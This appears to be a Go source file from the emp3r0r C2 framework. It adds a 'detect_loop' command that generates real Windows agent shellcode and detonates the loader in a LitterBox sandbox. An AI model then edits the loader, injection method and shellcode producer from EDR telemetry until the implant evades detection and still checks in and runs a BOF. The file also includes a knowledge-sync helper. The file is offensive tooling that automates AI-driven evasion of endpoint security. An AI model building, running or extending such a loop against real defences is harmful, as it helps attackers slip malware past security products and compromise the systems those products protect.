package operator

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/detection"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/modules"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/cli"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/sanitize"
	"github.com/spf13/cobra"
)

const operatorSubprocessEnv = "EMP3R0R_OPERATOR_SUBPROCESS"

// detectLoopCmd starts the autonomous Norma detection loop in a detached worker
// process. The console returns immediately; the loop writes one log file and a
// separate tmux window tails it, leaving emp3r0r.log alone.
func completeFlagValues(values ...string) func(*cobra.Command, []string, string) ([]string, cobra.ShellCompDirective) {
	return func(*cobra.Command, []string, string) ([]string, cobra.ShellCompDirective) {
		return values, cobra.ShellCompDirectiveNoFileComp
	}
}

func completeFlagDirs(*cobra.Command, []string, string) ([]string, cobra.ShellCompDirective) {
	return nil, cobra.ShellCompDirectiveFilterDirs
}

func completeFlagFiles(*cobra.Command, []string, string) ([]string, cobra.ShellCompDirective) {
	return nil, cobra.ShellCompDirectiveDefault
}

func detectLoopCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:     "detect_loop",
		GroupID: "agent",
		Short:   "Autonomously build, detonate, edit, and re-test loader_windows with Norma",
		Long: `Start the autonomous detection loop for loader_windows.

The command generates a real Go Windows agent shellcode when --shellcode is
omitted, then starts a detached detect-loop-worker process. The worker builds
the loader from --module-dir, detonates it in LitterBox, and lets a Norma agent
inspect the SQLite telemetry, edit module source, rebuild, and compare payloads.
C2 credentials stay in the operator process; the worker only reaches scoped
agent-generation and verification endpoints over a private Unix IPC socket.

--shellcode accepts any x64 position-independent shellcode. Without it, the
loop generates a Windows EXE agent and wraps it with donut. Pass
--agent-type windows_dll to build a DLL agent instead; it is wrapped with
crystal_pack when the Crystal Palace distribution, Java, and its build
toolchain are installed, and with donut otherwise. Norma can
change the loader, wrapper, injection path, or shellcode producer when telemetry
points at that design.

The loop imports every saved LitterBox analyzer result: RedEdr, Moneta,
pe-sieve, HollowsHunter, HSB, Patriot, Blender, YARA, CheckPlz, HolyGrail, and
every EDR profile. Full feedback, builds, and per-payload telemetry stay in
SQLite. The loop writes only its instructions and bounded tool results to the
model context.

The model can edit module and producer source, and the build scripts and
generators it edits run on this host with operator privileges. Treat the loop
as a code-execution feature controlled by an untrusted model, not as a
sandbox: run it in a dedicated, disposable VM or container with no host
credentials, no production C2 keys, and restricted network egress.

Set the model through the environment:
  EMP3R0R_DETECTION_PROVIDER=openai-responses
  EMP3R0R_DETECTION_MODEL=<model>
  EMP3R0R_DETECTION_BASE_URL=<url>
  OPENAI_API_KEY=<key>`,
		Example: "detect_loop --module-dir /path/to/core/modules/loader_windows --iterations 3",
		Args:    cobra.NoArgs,
		Run:     runDetectLoopCommand,
	}
	cmd.Flags().String("module-dir", "", "Module source directory (default: the installed loader_windows path)")
	cmd.Flags().String("shellcode", "", "x64 PIC shellcode (Donut, Crystal Palace PICO, ...); generated when omitted")
	cmd.Flags().String("agent-type", "auto", "Agent payload type to generate: auto, windows_executable, or windows_dll")
	cmd.Flags().String("arch", "amd64", "Agent architecture")
	cmd.Flags().String("cc", "", "C2 address for the generated agent; defaults to the current config, with container-only hosts replaced by a certificate IP reachable from LitterBox")
	cmd.Flags().String("sandbox", "", "LitterBox URL; defaults to EMP3R0R_DETECTION_SANDBOX or 127.0.0.1:1337")
	cmd.Flags().Int("iterations", 3, "Maximum detection cycles including the baseline (at most 50)")
	cmd.Flags().StringSlice("stages", []string{"static", "dynamic"}, "Stages to run")
	cmd.Flags().String("process", "", "Override the sacrificial process; empty uses the module default")
	cmd.Flags().String("format", "exe", "Loader host format: exe, service, or dll")
	cmd.Flags().String("inject", "", "Override the injection method; empty uses the module default")
	cmd.Flags().String("smw", "on", "SilentMoonwalk: on or off")
	cmd.Flags().StringSlice("producer", nil, "Shellcode producer as name=path (donut=..., crystal_pack=...); the baseline uses the installed producers")
	cmd.Flags().StringSlice("read-root", nil, "Read-only source root the model may inspect (repeatable)")
	cmd.Flags().String("knowledge", "", "Knowledge cache path; defaults to <detection store>/knowledge.db")
	cmd.Flags().Int("turns", 60, "Maximum Norma agent turns (at most 240)")
	cmd.Flags().Duration("timeout", 0, "Loop deadline; 0 means no deadline")
	cmd.Flags().Bool("tmux", true, "Open a separate tmux window tailing the loop log")
	cmd.Flags().String("goal", "", "High-level loop goal shown to the model")

	_ = cmd.RegisterFlagCompletionFunc("inject", completeFlagValues("apc", "ct", "self"))
	_ = cmd.RegisterFlagCompletionFunc("format", completeFlagValues("exe", "service", "dll"))
	_ = cmd.RegisterFlagCompletionFunc("agent-type", completeFlagValues("auto", builder.PayloadTypeWindowsExecutable, builder.PayloadTypeWindowsDLL))
	_ = cmd.RegisterFlagCompletionFunc("arch", completeFlagValues("amd64"))
	_ = cmd.RegisterFlagCompletionFunc("smw", completeFlagValues("on", "off"))
	_ = cmd.RegisterFlagCompletionFunc("stages", completeFlagValues("static", "dynamic"))
	_ = cmd.RegisterFlagCompletionFunc("process", completeFlagValues("dllhost.exe", "notepad.exe", "svchost.exe", "explorer.exe", "rundll32.exe"))
	_ = cmd.RegisterFlagCompletionFunc("producer", completeFlagValues("donut", "crystal_pack"))
	_ = cmd.RegisterFlagCompletionFunc("module-dir", completeFlagDirs)
	_ = cmd.RegisterFlagCompletionFunc("read-root", completeFlagDirs)
	_ = cmd.RegisterFlagCompletionFunc("shellcode", completeFlagFiles)
	_ = cmd.RegisterFlagCompletionFunc("knowledge", completeFlagFiles)
	cmd.AddCommand(KnowledgeSyncCmd())
	return cmd
}

type detectLoopOptions struct {
	ModuleDir string
	Shellcode string
	// ShellcodeProducer is the module that generated Shellcode when the
	// parent process built it, so the loop can tell the model which
	// producer source describes the blob.
	ShellcodeProducer string
	// AgentUUID is the identity of the generated baseline agent. The loop
	// uses it to prove that this payload checked in and can run a module.
	AgentUUID   string
	AgentType   string
	Arch        string
	CC          string
	Sandbox     string
	Iterations  int
	Stages      []string
	Process     string
	Format      string
	Inject      string
	SMW         string
	Producers   []string
	ReadRoots   []string
	Knowledge   string
	Turns       int
	Timeout     time.Duration
	Tmux        bool
	Goal        string
	RenderWidth int
}

func runDetectLoopCommand(cmd *cobra.Command, _ []string) {
	opts := detectLoopOptions{}
	opts.ModuleDir, _ = cmd.Flags().GetString("module-dir")
	opts.Shellcode, _ = cmd.Flags().GetString("shellcode")
	opts.AgentType, _ = cmd.Flags().GetString("agent-type")
	opts.Arch, _ = cmd.Flags().GetString("arch")
	opts.CC, _ = cmd.Flags().GetString("cc")
	opts.Sandbox, _ = cmd.Flags().GetString("sandbox")
	opts.Iterations, _ = cmd.Flags().GetInt("iterations")
	opts.Stages, _ = cmd.Flags().GetStringSlice("stages")
	opts.Process, _ = cmd.Flags().GetString("process")
	opts.Format, _ = cmd.Flags().GetString("format")
	opts.Inject, _ = cmd.Flags().GetString("inject")
	opts.SMW, _ = cmd.Flags().GetString("smw")
	opts.Producers, _ = cmd.Flags().GetStringSlice("producer")
	opts.ReadRoots, _ = cmd.Flags().GetStringSlice("read-root")
	opts.Knowledge, _ = cmd.Flags().GetString("knowledge")
	opts.Turns, _ = cmd.Flags().GetInt("turns")
	opts.Timeout, _ = cmd.Flags().GetDuration("timeout")
	opts.Tmux, _ = cmd.Flags().GetBool("tmux")
	opts.Goal, _ = cmd.Flags().GetString("goal")
	if strings.TrimSpace(opts.CC) == "" {
		opts.CC = loopC2Address(live.GetRuntimeConfig().CCAddress)
	}

	if opts.AgentType = strings.ToLower(strings.TrimSpace(opts.AgentType)); opts.AgentType == "" {
		opts.AgentType = "auto"
	}
	switch opts.AgentType {
	case "auto", builder.PayloadTypeWindowsExecutable, builder.PayloadTypeWindowsDLL:
	default:
		logging.Errorf("detect_loop: agent type must be auto, %s, or %s",
			builder.PayloadTypeWindowsExecutable, builder.PayloadTypeWindowsDLL)
		return
	}
	if opts.Arch != "amd64" {
		logging.Errorf("detect_loop: loader_windows is built for amd64; use --arch amd64")
		return
	}
	if opts.ModuleDir == "" {
		if mod, ok := def.GetModule("loader_windows"); ok && mod != nil {
			opts.ModuleDir = mod.Path
		}
	}
	if opts.ModuleDir == "" {
		logging.Errorf("detect_loop: pass --module-dir or install loader_windows")
		return
	}
	if info, err := os.Stat(opts.ModuleDir); err != nil || !info.IsDir() {
		logging.Errorf("detect_loop: module directory %q is not readable", opts.ModuleDir)
		return
	}
	// Expose the installed shellcode producers by default. The model may tune
	// them and rebuild the shellcode through BuildShellcode.
	if len(opts.Producers) == 0 {
		for name, dir := range detection.DefaultProducerDirs() {
			opts.Producers = append(opts.Producers, name+"="+dir)
		}
	}
	// The loader links shared sources outside its own directory; make them
	// readable (not writable) so the model can trace those call paths.
	if len(opts.ReadRoots) == 0 {
		opts.ReadRoots = detection.DefaultReadRoots(opts.ModuleDir)
	}

	logging.EnableColor()
	if opts.RenderWidth > 0 {
		logging.SetRenderWidth(opts.RenderWidth)
	}
	logDir := filepath.Join(live.EmpWorkSpace, "detection")
	if err := os.MkdirAll(logDir, 0o700); err != nil {
		logging.Errorf("detect_loop: create log directory: %v", err)
		return
	}
	logPath := filepath.Join(logDir, "detect-loop-"+time.Now().UTC().Format("20060102-150405")+".log")
	logFile, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		logging.Errorf("detect_loop: open log: %v", err)
		return
	}
	logger := newLoopLogger(logFile)
	logf := logger.printf

	if opts.Tmux {
		window, tmuxErr := cli.TmuxNewPane("Detection Loop", "", "", 0,
			"tail -F "+shellQuotePath(logPath))
		if tmuxErr != nil {
			logging.Warningf("detect_loop: tmux window: %v", tmuxErr)
		} else {
			opts.RenderWidth = window.Width
			logging.Infof("Detection loop log: %s (tmux %s)", logPath, window.ID)
		}
	}
	if !detection.ModelConfigured() {
		logging.Errorf("detect_loop: no detection model configured; set EMP3R0R_DETECTION_MODEL and OPENAI_API_KEY or ANTHROPIC_API_KEY")
		logf("no detection model configured; set EMP3R0R_DETECTION_MODEL and the provider API key")
		return
	}
	loopID := "loop-" + time.Now().UTC().Format("20060102-150405")
	logging.Infof("Detection loop started; log: %s", logPath)

	go func() {
		shellcode := strings.TrimSpace(opts.Shellcode)
		if shellcode == "" {
			logf("generating real Go agent shellcode (%s/%s)", opts.AgentType, opts.Arch)
			generated, producer, agentType, agentUUID, genErr := generateAgentShellcode(opts, logf)
			if genErr != nil {
				logf("shellcode generation failed: %v", genErr)
				logger.close()
				return
			}
			shellcode = generated
			opts.AgentType = agentType
			opts.ShellcodeProducer = producer
			opts.AgentUUID = agentUUID
			logf("generated %s shellcode: %s", producer, shellcode)
		}
		if err := startDetectLoopWorker(opts, shellcode, loopID, logFile, logger); err != nil {
			logger.close()
			logf("worker start failed: %v", err)
		}
	}()
}

// loopC2Address keeps the payload's C2 URL reachable from the LitterBox guest.
// host.containers.internal is a Podman/Docker name on the operator host and
// does not resolve inside the Windows VM; prefer a non-loopback IP from the
// server certificate, which the guest can reach through the host gateway.
func loopC2Address(configured string) string {
	configured = strings.TrimSpace(configured)
	if configured == "" {
		return ""
	}
	u, err := url.Parse(configured)
	if err != nil || u.Hostname() == "" {
		return configured
	}
	host := u.Hostname()
	ip := net.ParseIP(host)
	if host != "host.containers.internal" && host != "localhost" && (ip == nil || !ip.IsLoopback()) {
		return configured
	}
	port := u.Port()
	if port == "" {
		port = live.GetRuntimeConfig().CCH2Port
	}
	for _, name := range transport.NamesInCert(transport.ServerCrtFile) {
		candidate := net.ParseIP(name)
		if candidate == nil || candidate.IsLoopback() {
			continue
		}
		u.Host = net.JoinHostPort(candidate.String(), port)
		return u.String()
	}
	return configured
}

func generateAgentShellcode(opts detectLoopOptions, logf func(string, ...any)) (string, string, string, string, error) {
	producers, err := detection.ParseProducerDirs(opts.Producers)
	if err != nil {
		return "", "", "", "", err
	}
	producer, producerDir, agentType := chooseShellcodeProducer(producers, opts.AgentType)
	if producer == "" {
		return "", "", "", "", fmt.Errorf("no shellcode producer configured for agent type %s; pass --shellcode or add a matching --producer entry", opts.AgentType)
	}
	agentCfg := builder.AgentConfig{}
	if strings.TrimSpace(opts.CC) != "" {
		cc := strings.TrimSpace(opts.CC)
		agentCfg.CCAddress = &cc
	}
	logf("agent type: %s; producer: %s", agentType, producer)
	// The builder mutates shared runtime and on-disk config; serialize with
	// the manual generate commands and the model's GenerateAgent tool.
	generationMu.Lock()
	result, err := builder.GenerateAgentArtifact(agentCfg, agentType, opts.Arch, client.SignAgent)
	if err != nil {
		logf("signed generation failed (%v); building without a C2 signature", err)
		result, err = builder.GenerateAgentArtifact(agentCfg, agentType, opts.Arch, nil)
	}
	generationMu.Unlock()
	if err != nil {
		return "", "", "", "", err
	}
	if result == nil || strings.TrimSpace(result.OutputFile) == "" {
		return "", "", "", "", fmt.Errorf("agent build produced no artifact")
	}

	flags := map[string]string{"output": result.OutputFile + "." + producerShellcodeExt(producer)}
	switch producer {
	case "crystal_pack":
		flags["dll"] = result.OutputFile
	case "donut":
		flags["input"] = result.OutputFile
	default:
		return "", "", "", "", fmt.Errorf("producer %q has no agent wrapper", producer)
	}
	buildLog, err := modules.BuildLocalModuleAt(producerDir, producer, flags)
	if err != nil {
		return "", "", "", "", fmt.Errorf("%s producer: %w\n%s", producer, err, lastLogLines(buildLog, 20))
	}
	payloads := detection.ParseGeneratedPayloads(buildLog)
	if len(payloads) == 0 {
		return "", "", "", "", fmt.Errorf("%s producer did not report a generated payload", producer)
	}
	return payloads[len(payloads)-1].Path, producer, agentType, result.AgentUUID, nil
}

// chooseShellcodeProducer maps an agent type to a producer: donut wraps a
// Windows EXE, crystal_pack wraps a DLL as Crystal Palace PICO and is used when
// that module can link on this host. The producer also fixes the agent type
// because crystal_pack only accepts a DLL.
func chooseShellcodeProducer(producers map[string]string, requested string) (producer, dir, agentType string) {
	requested = strings.ToLower(strings.TrimSpace(requested))
	switch requested {
	case builder.PayloadTypeWindowsExecutable:
		if dir := strings.TrimSpace(producers["donut"]); dir != "" {
			return "donut", dir, builder.PayloadTypeWindowsExecutable
		}
		return "", "", ""
	case builder.PayloadTypeWindowsDLL:
		if dir := strings.TrimSpace(producers["crystal_pack"]); dir != "" && crystalPackAvailable(dir) {
			return "crystal_pack", dir, builder.PayloadTypeWindowsDLL
		}
		if dir := strings.TrimSpace(producers["donut"]); dir != "" {
			return "donut", dir, builder.PayloadTypeWindowsDLL
		}
		return "", "", ""
	}
	if dir := strings.TrimSpace(producers["donut"]); dir != "" {
		return "donut", dir, builder.PayloadTypeWindowsExecutable
	}
	if dir := strings.TrimSpace(producers["crystal_pack"]); dir != "" && crystalPackAvailable(dir) {
		return "crystal_pack", dir, builder.PayloadTypeWindowsDLL
	}
	return "", "", ""
}

func producerShellcodeExt(producer string) string {
	if producer == "crystal_pack" {
		return "pico.bin"
	}
	return "bin"
}

// chooseShellcodeProducer maps an agent type to a producer: donut wraps a
// Windows EXE, crystal_pack wraps a DLL as Crystal Palace PICO and is used when
// that module can link on this host. Neither is required to be installed.
//
// crystalPackAvailable reports whether crystal_pack can actually link a PICO
// on this host: a Java runtime, the vendored Crystal Palace jar, and the loader
// spec must all be present.
func crystalPackAvailable(dir string) bool {
	jar := filepath.Join(dir, "crystalpalace", "crystalpalace.jar")
	if info, err := os.Stat(jar); err != nil || !info.Mode().IsRegular() {
		return false
	}
	spec := filepath.Join(dir, "postex-loader", "loader.spec")
	if info, err := os.Stat(spec); err != nil || !info.Mode().IsRegular() {
		return false
	}
	libtcg := filepath.Join(dir, "libtcg.x64.zip")
	if info, err := os.Stat(libtcg); err != nil || !info.Mode().IsRegular() {
		return false
	}
	if !crystalPackToolchain() {
		return false
	}
	java := strings.TrimSpace(os.Getenv("JAVA"))
	if java == "" {
		java = "java"
	}
	return commandExists(java)
}

// crystalPackToolchain mirrors build.sh: postex-loader objects are rebuilt on
// every link, so a Windows C compiler and nasm must be resolvable. CC_64 and
// ZIG may contain arguments (for example "zig cc -target ..."), so only the
// command word is resolved.
func crystalPackToolchain() bool {
	compiler := strings.TrimSpace(os.Getenv("CC_64"))
	if compiler == "" {
		if commandExists("x86_64-w64-mingw32-gcc") {
			compiler = "x86_64-w64-mingw32-gcc"
		} else {
			compiler = strings.TrimSpace(os.Getenv("ZIG"))
			if compiler == "" {
				compiler = "zig"
			}
		}
	}
	if !commandExists(compiler) {
		return false
	}
	nasm := strings.TrimSpace(os.Getenv("NASM"))
	if nasm == "" {
		nasm = "nasm"
	}
	return commandExists(nasm)
}

// commandExists reports whether the first word of a shell command is an
// executable. Environment overrides such as CC_64 can carry target flags.
func commandExists(command string) bool {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return false
	}
	_, err := exec.LookPath(fields[0])
	return err == nil
}

func lastLogLines(log string, n int) string {
	lines := strings.Split(strings.TrimSpace(log), "\n")
	if len(lines) > n {
		lines = lines[len(lines)-n:]
	}
	return strings.Join(lines, "\n")
}

// loopLogger serializes progress and class-tagged lines into one log file or
// stdout stream.
type loopLogger struct {
	mu sync.Mutex
	w  io.Writer
}

func newLoopLogger(w io.Writer) *loopLogger { return &loopLogger{w: w} }

func (l *loopLogger) close() {
	l.mu.Lock()
	defer l.mu.Unlock()
	if closer, ok := l.w.(io.Closer); ok {
		_ = closer.Close()
	}
}

func (l *loopLogger) printf(format string, args ...any) {
	l.mu.Lock()
	defer l.mu.Unlock()
	line := sanitize.SanitizeText(fmt.Sprintf(format, args...))
	fmt.Fprintf(l.w, "%s %s\n", time.Now().UTC().Format("15:04:05"), line)
}

func (l *loopLogger) logf(class logging.Class, format string, args ...any) {
	l.mu.Lock()
	defer l.mu.Unlock()
	logging.ClassfTo(l.w, class, format, args...)
}

func classTag(class logging.Class) string {
	switch class {
	case logging.ClassThinking:
		return "thinking"
	case logging.ClassModel:
		return "model"
	case logging.ClassTool:
		return "tool"
	case logging.ClassToolResult:
		return "result"
	case logging.ClassBuild:
		return "build"
	case logging.ClassCycle:
		return "cycle"
	case logging.ClassEdit:
		return "edit"
	case logging.ClassAnswer:
		return "answer"
	case logging.ClassReport:
		return "report"
	case logging.ClassWarning:
		return "warn"
	case logging.ClassError:
		return "error"
	default:
		return "line"
	}
}

// startDetectLoopWorker launches the detached detect-loop-worker subprocess
// alongside a parent-owned scoped Unix IPC server. C2 credentials stay in the
// operator process; each worker attempt receives only the IPC socket path and a
// per-run bearer token via environment variable.
func startDetectLoopWorker(opts detectLoopOptions, shellcode, loopID string, logFile *os.File, logger *loopLogger) error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve executable: %w", err)
	}
	ipcServer, err := newDetectIPCServer(opts.CC, opts.AgentUUID, nil)
	if err != nil {
		return fmt.Errorf("start detect IPC server: %w", err)
	}
	goal := strings.TrimSpace(opts.Goal)
	if goal == "" {
		goal = "Keep the loader evasive while making the payload actually execute; the final agent must come online and run a BOF."
	}
	opts.Goal = goal

	go func() {
		defer ipcServer.Close()
		defer logger.close()
		baseLoopID := loopID
		currentShellcode := shellcode
		currentOpts := opts
		currentLoopID := baseLoopID
		for attempt := 1; attempt <= 3; attempt++ {
			if attempt > 1 {
				if strings.TrimSpace(currentOpts.Shellcode) != "" {
					logger.printf("payload verification failed; --shellcode was supplied and cannot be regenerated")
					break
				}
				logger.printf("payload verification failed; restarting loop with a fresh agent (attempt %d/3)", attempt)
				forgetLoopAgent(ipcServer.ActiveUUID())
				nextShellcode, producer, agentType, agentUUID, genErr := generateAgentShellcode(currentOpts, logger.printf)
				if genErr != nil {
					logger.printf("restart shellcode generation failed: %v", genErr)
					break
				}
				currentShellcode = nextShellcode
				currentOpts.AgentType = agentType
				currentOpts.ShellcodeProducer = producer
				currentOpts.AgentUUID = agentUUID
				currentLoopID = fmt.Sprintf("%s-r%d", baseLoopID, attempt)
				ipcServer.ResetAttempt(agentUUID)
				logger.printf("restarted loop %s with agent %s", currentLoopID, agentUUID)
			}

			args := detectLoopWorkerArgs(currentOpts, currentShellcode, currentLoopID, ipcServer.SockPath())
			worker := exec.Command(exe, args...)
			worker.Stdout = logFile
			worker.Stderr = logFile
			worker.Env = append(os.Environ(), detectIPCTokenEnv+"="+ipcServer.Token())
			detachWorker(worker)
			if startErr := worker.Start(); startErr != nil {
				logging.Errorf("Detection loop worker start failed: %v", startErr)
				logger.printf("worker start failed: %v", startErr)
				break
			}
			logger.printf("worker pid=%d; log=%s", worker.Process.Pid, logFile.Name())
			waitErr := worker.Wait()

			reportPath := filepath.Join(live.EmpWorkSpace, "detection", "reports", currentLoopID+".md")
			if summary, source := readLoopSummary(reportPath); summary != "" {
				logging.Successf("Detection loop report: %s", reportPath)
				logging.DisplayMarkdown(summary)
				logger.printf("executive summary printed from %s", source)
			}
			if waitErr != nil {
				logging.Errorf("Detection loop failed: %v", waitErr)
				logger.printf("worker exited: %v", waitErr)
				break
			}
			if ipcServer.Verified() {
				return
			}
			if attempt == 3 {
				logger.printf("payload still not verified after %d attempts", attempt)
			}
		}
	}()
	return nil
}

func detectLoopWorkerArgs(opts detectLoopOptions, shellcode, loopID, ipcSock string) []string {
	agentType := strings.ToLower(strings.TrimSpace(opts.AgentType))
	if agentType == "" || agentType == "auto" {
		agentType = builder.PayloadTypeWindowsExecutable
	}
	args := []string{
		"detect-loop-worker",
		"--module", "loader_windows",
		"--module-dir", opts.ModuleDir,
		"--shellcode", shellcode,
		"--sandbox", opts.Sandbox,
		"--iterations", strconv.Itoa(opts.Iterations),
		"--stages", strings.Join(opts.Stages, ","),
		"--format", opts.Format,
		"--smw", opts.SMW,
		"--agent-type", agentType,
		"--arch", opts.Arch,
		"--turns", strconv.Itoa(opts.Turns),
		"--timeout", opts.Timeout.String(),
		"--loop-id", loopID,
	}
	if strings.TrimSpace(opts.Process) != "" {
		args = append(args, "--process", opts.Process)
	}
	if strings.TrimSpace(opts.CC) != "" {
		args = append(args, "--agent-cc", opts.CC)
	}
	if strings.TrimSpace(opts.AgentUUID) != "" {
		args = append(args, "--expected-agent-uuid", opts.AgentUUID)
	}
	if strings.TrimSpace(opts.Inject) != "" {
		args = append(args, "--inject", opts.Inject)
	}
	if producer := strings.TrimSpace(opts.ShellcodeProducer); producer != "" {
		args = append(args, "--shellcode-producer", producer)
	}
	for _, producer := range opts.Producers {
		args = append(args, "--producer", producer)
	}
	for _, root := range opts.ReadRoots {
		args = append(args, "--read-root", root)
	}
	if strings.TrimSpace(opts.Knowledge) != "" {
		args = append(args, "--knowledge", opts.Knowledge)
	}
	if strings.TrimSpace(opts.Goal) != "" {
		args = append(args, "--goal", opts.Goal)
	}
	if opts.RenderWidth > 0 {
		args = append(args, "--render-width", strconv.Itoa(opts.RenderWidth))
	}
	if strings.TrimSpace(ipcSock) != "" {
		args = append(args, "--ipc-sock", ipcSock)
	}
	return args
}

// RunDetectLoopWorker is the detached worker entry point. It holds no C2
// credentials, WireGuard keys, or tmux/MCP state; when ipcSock is provided, it
// reaches only the parent's scoped agent-generation and verification endpoints.
func RunDetectLoopWorker(ctx context.Context, cfg detection.EvolveConfig, ipcSock string) error {
	workerLog := newLoopLogger(os.Stdout)
	cfg.Logf = workerLog.logf
	if sock := strings.TrimSpace(ipcSock); sock != "" {
		ipcClient, err := NewDetectIPCClient(sock, os.Getenv(detectIPCTokenEnv))
		if err != nil {
			return err
		}
		cfg.BuildAgent = ipcClient.BuildAgent
		cfg.Verify = ipcClient
		cfg.FinalVerify = ipcClient.FinalVerify
		cfg.Audit = ipcClient.AuditLocalDenial
	}
	_, err := detection.RunEvolve(ctx, cfg)
	return err
}

// forgetLoopAgent drops the prior test identity so a restart never reuses a
// TOFU-pinned UUID.
func forgetLoopAgent(uuid string) {
	uuid = strings.TrimSpace(uuid)
	if uuid == "" {
		return
	}
	if _, err := client.SendCBORRequest(transport.OperatorForgetAgent, def.Operation{
		AgentTag: uuid, Action: "forget_agent",
	}); err != nil {
		logging.Warningf("detect_loop: forget previous agent %s: %v", uuid, err)
	}
}

// readLoopSummary returns the compact summary next to the full report.
func readLoopSummary(reportPath string) (string, string) {
	summaryPath := strings.TrimSuffix(reportPath, ".md") + "-summary.md"
	if summary, err := os.ReadFile(summaryPath); err == nil && strings.TrimSpace(string(summary)) != "" {
		return string(summary), summaryPath
	}
	report, err := os.ReadFile(reportPath)
	if err != nil {
		return "", ""
	}
	text := string(report)
	if cut := strings.Index(text, "\n## Cycles"); cut > 0 {
		text = text[:cut]
	}
	return strings.TrimSpace(text), reportPath
}

func shellQuotePath(path string) string {
	return "'" + strings.ReplaceAll(path, "'", `'\''`) + "'"
}

// KnowledgeSyncCmd refreshes the offline reference cache. The loop itself
// never makes network calls, so this command is the only writer.
func KnowledgeSyncCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "knowledge-sync",
		Short: "Refresh the offline reference notebook used by the detection loop",
		Long: `Download document summaries from a notebook MCP server into the detection
store's SQLite FTS cache. The loop reads this cache; it does not have network
access. Add --content to cache full document text as well.`,
		Args: cobra.NoArgs,
		Run:  runKnowledgeSyncCommand,
	}
	cmd.Flags().String("url", "https://archeotech.r00ted.ch/mcp", "Notebook MCP endpoint")
	cmd.Flags().String("db", "", "Cache path; defaults to <detection store>/knowledge.db")
	cmd.Flags().String("notebook", "", "Only sync one notebook")
	cmd.Flags().Bool("content", false, "Also cache full document content")
	return cmd
}

// runKnowledgeSyncCommand keeps console input responsive by syncing in a child process.
func runKnowledgeSyncCommand(cmd *cobra.Command, _ []string) {
	if cli.OutputPane == nil {
		runKnowledgeSync(cmd)
		return
	}
	if err := startOutputPaneSubprocess("knowledge-sync", knowledgeSyncArgs(cmd)...); err != nil {
		logging.Errorf("knowledge-sync: %v", err)
		return
	}
	logging.Infof("knowledge-sync started in the background; output follows in this pane")
}

func runKnowledgeSync(cmd *cobra.Command) {
	if os.Getenv(operatorSubprocessEnv) == "1" {
		// The console parent captures this process's stdout and mirrors it to
		// the output pane. Send logger messages there as well as to the file.
		logging.AddWriter(os.Stdout)
	}
	urlFlag, _ := cmd.Flags().GetString("url")
	dbPath, _ := cmd.Flags().GetString("db")
	notebook, _ := cmd.Flags().GetString("notebook")
	content, _ := cmd.Flags().GetBool("content")
	if dbPath == "" {
		dbPath = defaultKnowledgePath()
	}
	db, err := detection.OpenKnowledgeDB(dbPath, true)
	if err != nil {
		logging.Errorf("knowledge-sync: %v", err)
		return
	}
	defer func() { _ = db.Close() }()
	stats, err := detection.SyncKnowledge(context.Background(), db, detection.KnowledgeSyncOptions{
		URL: urlFlag, Notebook: notebook, Content: content,
		Logf: func(line string) { fmt.Println(line) },
	})
	if err != nil {
		logging.Errorf("knowledge-sync: %v", err)
		return
	}
	logging.Successf("Knowledge cache %s: %d summaries, %d contents from %d notebooks",
		dbPath, stats.Summaries, stats.Contents, stats.Notebooks)
}

// knowledgeSyncArgs rebuilds the child's argv from the parsed command. The
// database path is resolved here so the child writes the same cache.
func knowledgeSyncArgs(cmd *cobra.Command) []string {
	urlFlag, _ := cmd.Flags().GetString("url")
	dbPath, _ := cmd.Flags().GetString("db")
	notebook, _ := cmd.Flags().GetString("notebook")
	content, _ := cmd.Flags().GetBool("content")
	if dbPath == "" {
		dbPath = defaultKnowledgePath()
	}
	args := []string{"knowledge-sync", "--url", urlFlag, "--db", dbPath}
	if notebook != "" {
		args = append(args, "--notebook", notebook)
	}
	if content {
		args = append(args, "--content")
	}
	return args
}

// startOutputPaneSubprocess mirrors this executable's output to the pane.
func startOutputPaneSubprocess(label string, args ...string) error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve executable: %w", err)
	}
	child := exec.Command(exe, args...)
	child.Env = append(os.Environ(), operatorSubprocessEnv+"=1")
	stdout, err := child.StdoutPipe()
	if err != nil {
		return fmt.Errorf("open %s stdout: %w", label, err)
	}
	stderr, err := child.StderrPipe()
	if err != nil {
		return fmt.Errorf("open %s stderr: %w", label, err)
	}
	if err := child.Start(); err != nil {
		return fmt.Errorf("start %s: %w", label, err)
	}

	stream := func(r io.Reader) {
		reader := bufio.NewReader(r)
		for {
			line, readErr := reader.ReadString('\n')
			if line = strings.TrimRight(line, "\r\n"); line != "" {
				logging.Infof("%s", line)
			}
			if readErr != nil {
				if readErr != io.EOF {
					logging.Errorf("%s: read output: %v", label, readErr)
				}
				return
			}
		}
	}

	var readers sync.WaitGroup
	readers.Add(2)
	go func() {
		defer readers.Done()
		stream(stdout)
	}()
	go func() {
		defer readers.Done()
		stream(stderr)
	}()
	go func() {
		readers.Wait()
		if waitErr := child.Wait(); waitErr != nil {
			logging.Errorf("%s exited: %v", label, waitErr)
		}
	}()
	return nil
}

// defaultKnowledgePath resolves the cache location outside an initialized
// console workspace.
func defaultKnowledgePath() string {
	root := strings.TrimSpace(live.EmpWorkSpace)
	if root == "" {
		if home, err := os.UserHomeDir(); err == nil {
			root = filepath.Join(home, ".emp3r0r")
		}
	}
	return detection.KnowledgePath(filepath.Join(root, "detection"))
}
